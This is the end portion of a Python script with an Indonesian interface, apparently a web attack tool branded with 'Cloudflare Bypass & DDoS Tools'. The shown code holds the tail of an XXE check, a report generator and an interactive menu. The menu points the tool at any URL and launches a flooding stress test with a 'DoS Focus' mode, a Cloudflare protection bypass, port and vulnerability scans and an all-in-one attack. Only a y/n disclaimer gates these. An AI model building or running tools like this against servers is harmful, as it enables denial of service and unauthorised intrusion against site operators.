                    'vulnerable': True,
                    'details': "XXE vulnerability detected"
                }
        except:
            pass
        
        return {'vulnerable': False, 'details': ''}
    
    def generate_advanced_report(self):
        """Generate comprehensive advanced report"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}📊 LAPORAN KOMPREHENSIF ADVANCED PENETRATION TEST")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"\n{Fore.YELLOW}🎯 Target: {self.url}")
        print(f"{Fore.YELLOW}⏰ Waktu: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.YELLOW}🔧 Tools: Advanced Web Server Tester v2.0")
        
        total_vulnerabilities = 0
        total_tests = 0
        
        for test_name, result in self.results.items():
            print(f"\n{Fore.CYAN}📋 {test_name.upper().replace('_', ' ')}:")
            
            if 'status' in result:
                status = result['status']
                if status in ['SUCCESS', 'COMPLETED']:
                    status_display = f"{Fore.GREEN}✓ {status}"
                elif status == 'FAILED':
                    status_display = f"{Fore.RED}✗ {status}"
                else:
                    status_display = f"{Fore.YELLOW}⚠ {status}"
                
                print(f"   Status: {status_display}")
            
            # Print key metrics
            for key, value in result.items():
                if key != 'status' and key != 'headers':
                    if isinstance(value, dict):
                        print(f"   {key}:")
                        for k2, v2 in value.items():
                            if isinstance(v2, list):
                                if v2:
                                    print(f"     • {k2}:")
                                    for item in v2:
                                        print(f"       - {item}")
                            else:
                                print(f"     • {k2}: {v2}")
                    elif isinstance(value, list):
                        if value:
                            print(f"   {key}:")
                            for item in value:
                                if isinstance(item, dict):
                                    for k, v in item.items():
                                        print(f"     • {k}: {v}")
                                else:
                                    print(f"     • {item}")
                    else:
                        print(f"   • {key}: {value}")
            
            # Count vulnerabilities
            if 'vulnerabilities_found' in result:
                total_vulnerabilities += result['vulnerabilities_found']
            if 'tests_performed' in result:
                total_tests += result['tests_performed']
        
        # Summary
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}📈 RINGKASAN HASIL:")
        print(f"{Fore.CYAN}{'='*80}")
        
        if 'advanced_stress_test' in self.results:
            stress = self.results['advanced_stress_test']
            print(f"{Fore.GREEN}[✓] Stress Test: {stress.get('requests_per_second', 'N/A')} RPS")
            print(f"{Fore.GREEN}[✓] Impact Level: {stress.get('impact_level', 'N/A')}")
        
        if 'vulnerability_scan' in self.results:
            vuln = self.results['vulnerability_scan']
            print(f"{Fore.GREEN}[✓] Vulnerabilities: {vuln.get('vulnerabilities_found', 0)} ditemukan")
        
        print(f"\n{Fore.YELLOW}[*] Total Tests Dilakukan: {total_tests}")
        print(f"{Fore.YELLOW}[*] Total Vulnerabilities Ditemukan: {total_vulnerabilities}")
        
        # Security Recommendations
        if total_vulnerabilities > 0:
            print(f"\n{Fore.RED}{'='*80}")
            print(f"{Fore.RED}⚠️  REKOMENDASI KEAMANAN:")
            print(f"{Fore.RED}{'='*80}")
            print(f"{Fore.YELLOW}1. Segera perbaiki {total_vulnerabilities} vulnerabilities yang ditemukan")
            print(f"{Fore.YELLOW}2. Implementasi WAF (Web Application Firewall)")
            print(f"{Fore.YELLOW}3. Update semua software dan dependencies")
            print(f"{Fore.YELLOW}4. Lakukan penetration testing berkala")
            print(f"{Fore.YELLOW}5. Implementasi rate limiting dan DDoS protection")
        
        print(f"\n{Fore.GREEN}[✓] Laporan selesai! File log disimpan di memory.")

def display_banner():
    """Display program banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗ ███████╗██████╗  ║
║ ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝ ██╔════╝██╔══██╗ ║
║ ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║  ███╗█████╗  ██║  ██║ ║
║ ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██║  ██║ ║
║ ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╔╝███████╗██████╔╝ ║
║ ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═════╝  ║
║                                                                      ║
║              ADVANCED WEB SERVER PENETRATION TESTER v2.0            ║
║                  dengan Cloudflare Bypass & DDoS Tools               ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

def main_menu():
    """Display main menu"""
    print(f"\n{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║                          MENU UTAMA ADVANCED                          ║")
    print(f"{Fore.YELLOW}╠══════════════════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}║  1. {Fore.WHITE}Tes Konektivitas & Deteksi Cloudflare                    {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  2. {Fore.WHITE}ADVANCED Stress Test (DDoS Simulation)                   {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  3. {Fore.WHITE}Cloudflare Bypass Test                                   {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  4. {Fore.WHITE}Advanced Port Scanning                                   {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  5. {Fore.WHITE}Vulnerability Scanning                                   {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  6. {Fore.WHITE}Comprehensive Penetration Attack (ALL-IN-ONE)            {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  7. {Fore.WHITE}Tampilkan Laporan Lengkap                                {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  8. {Fore.WHITE}Ganti Target URL                                         {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  9. {Fore.WHITE}Settings & Configuration                                 {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  0. {Fore.RED}Exit/Keluar                                              {Fore.CYAN}║")
    print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

def main():
    """Main function"""
    display_banner()
    
    print(f"\n{Fore.CYAN}[*] ADVANCED WEB SERVER PENETRATION TESTER v2.0")
    print(f"{Fore.RED}[!] PERINGATAN: Tool ini hanya untuk testing server yang Anda miliki!")
    print(f"{Fore.RED}[!] Penggunaan illegal akan ditindak sesuai hukum yang berlaku!\n")
    
    # Disclaimer
    print(f"{Fore.YELLOW}[!] DISCLAIMER:")
    print(f"{Fore.YELLOW}    - Tool ini untuk tujuan edukasi dan security testing")
    print(f"{Fore.YELLOW}    - Dapatkan izin tertulis sebelum testing server orang lain")
    print(f"{Fore.YELLOW}    - Penulis tidak bertanggung jawab atas penyalahgunaan")
    
    accept = input(f"\n{Fore.YELLOW}[?] Apakah Anda setuju dengan terms di atas? (y/n): ")
    if accept.lower() != 'y':
        print(f"{Fore.RED}[✗] Anda harus menyetujui terms untuk melanjutkan")
        return
    
    # Get initial URL
    if len(sys.argv) > 1:
        url = sys.argv[1]
        print(f"{Fore.GREEN}[✓] Target dari argumen: {url}")
    else:
        url = input(f"{Fore.YELLOW}[?] Masukkan URL target (contoh: https://example.com): {Fore.WHITE}").strip()
        if not url:
            print(f"{Fore.RED}[✗] URL tidak boleh kosong!")
            return
    
    tester = AdvancedWebServerTester(url)
    
    while True:
        main_menu()
        
        try:
            choice = input(f"\n{Fore.YELLOW}[?] Pilih menu (0-9): {Fore.WHITE}").strip()
            
            if choice == '0':
                print(f"\n{Fore.GREEN}[✓] Terima kasih telah menggunakan tool ini!")
                print(f"{Fore.YELLOW}[!] Ingat: Gunakan hanya untuk tujuan yang legal!")
                print(f"{Fore.CYAN}[*] Tool by Advanced Security Research Team")
                break
            
            elif choice == '1':
                print(f"\n{Fore.CYAN}{'='*60}")
                print(f"{Fore.YELLOW}[*] TES KONEKTIVITAS & DETEKSI CLOUDFLARE")
                print(f"{Fore.CYAN}{'='*60}")
                tester.test_basic_connectivity()
            
            elif choice == '2':
                print(f"\n{Fore.CYAN}{'='*60}")
                print(f"{Fore.YELLOW}[*] ADVANCED STRESS TEST / DDoS SIMULATION")
                print(f"{Fore.CYAN}{'='*60}")
                
                print(f"{Fore.RED}[!] PERINGATAN: Ini akan MEMBEBANI BERAT server target!")
                
                try:
                    duration = int(input(f"{Fore.YELLOW}[?] Durasi (detik, default 30): {Fore.WHITE}") or "30")
                    concurrent = int(input(f"{Fore.YELLOW}[?] Concurrent connections (default 50): {Fore.WHITE}") or "50")
                    
                    print(f"\n{Fore.YELLOW}[?] Pilih attack mode:")
                    print(f"   1. Intensive (default) - Mixed attacks")
                    print(f"   2. DoS Focus - Maximum traffic")
                    print(f"   3. Stealth - Slow but persistent")
                    
                    mode_choice = input(f"{Fore.YELLOW}[?] Mode (1-3, default 1): {Fore.WHITE}") or "1"
                    modes = {'1': 'intensive', '2': 'dos', '3': 'stealth'}
                    mode = modes.get(mode_choice, 'intensive')
                    
                    confirm = input(f"\n{Fore.RED}[?] KONFIRMASI: Attack {duration}s dengan {concurrent} connections? (y/n): {Fore.WHITE}")
                    if confirm.lower() == 'y':
                        tester.advanced_stress_test(duration, concurrent, mode)
                    else:
                        print(f"{Fore.YELLOW}[!] Stress test dibatalkan")
                except ValueError:
                    print(f"{Fore.RED}[✗] Input tidak valid!")
            
            elif choice == '3':
                print(f"\n{Fore.CYAN}{'='*60}")
                print(f"{Fore.YELLOW}[*] CLOUDFLARE BYPASS TEST")
                print(f"{Fore.CYAN}{'='*60}")
                
                print(f"{Fore.YELLOW}[!] Mencoba berbagai teknik bypass Cloudflare...")
                tester.cloudflare_bypass_test()
            
            elif choice == '4':
                print(f"\n{Fore.CYAN}{'='*60}")
                print(f"{Fore.YELLOW}[*] ADVANCED PORT SCANNING")
                print(f"{Fore.CYAN}{'='*60}")
                
                tester.advanced_port_scan()
            
            elif choice == '5':
                print(f"\n{Fore.CYAN}{'='*60}")
                print(f"{Fore.YELLOW}[*] VULNERABILITY SCANNING")
                print(f"{Fore.CYAN}{'='*60}")
                
                print(f"{Fore.YELLOW}[!] Scanning vulnerabilities...")
                tester.advanced_vulnerability_scan()
            
            elif choice == '6':
                tester.run_comprehensive_attack()
            
            elif choice == '7':
                if tester.results:
                    tester.generate_advanced_report()
                else:
                    print(f"{Fore.YELLOW}[!] Belum ada hasil tes. Jalankan tes terlebih dahulu.")
            
            elif choice == '8':
                new_url = input(f"\n{Fore.YELLOW}[?] Masukkan URL target baru: {Fore.WHITE}").strip()
                if new_url:
                    tester = AdvancedWebServerTester(new_url)
                    print(f"{Fore.GREEN}[✓] Target diganti ke: {new_url}")
                else:
                    print(f"{Fore.RED}[✗] URL tidak valid!")
            
            elif choice == '9':
                print(f"\n{Fore.CYAN}{'='*60}")
                print(f"{Fore.YELLOW}[*] SETTINGS & CONFIGURATION")
                print(f"{Fore.CYAN}{'='*60}")
                
                print(f"{Fore.GREEN}[✓] Current Target: {tester.url}")
                print(f"{Fore.GREEN}[✓] User-Agent Rotation: Enabled")
                print(f"{Fore.GREEN}[✓] SSL Verification: Disabled")
                print(f"{Fore.GREEN}[✓] Connection Pool: Enabled")
                print(f"\n{Fore.YELLOW}[!] Settings advanced sudah optimal untuk penetration testing")
            
            else:
                print(f"{Fore.RED}[✗] Pilihan tidak valid!")
            
            input(f"\n{Fore.YELLOW}[?] Tekan Enter untuk melanjutkan...")
            display_banner()
            
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Program dihentikan oleh pengguna")
            break
        except Exception as e:
            print(f"\n{Fore.RED}[✗] Error: {str(e)}")
            time.sleep(2)

if __name__ == "__main__":
    # Check requirements
    try:
        import requests
        import colorama
        from fake_useragent import UserAgent
    except ImportError:
        print(f"{Fore.RED}[✗] Package tidak ditemukan. Install dengan:")
        print(f"{Fore.YELLOW}pip install requests colorama fake-useragent")
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Program dihentikan")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Fatal error: {str(e)}")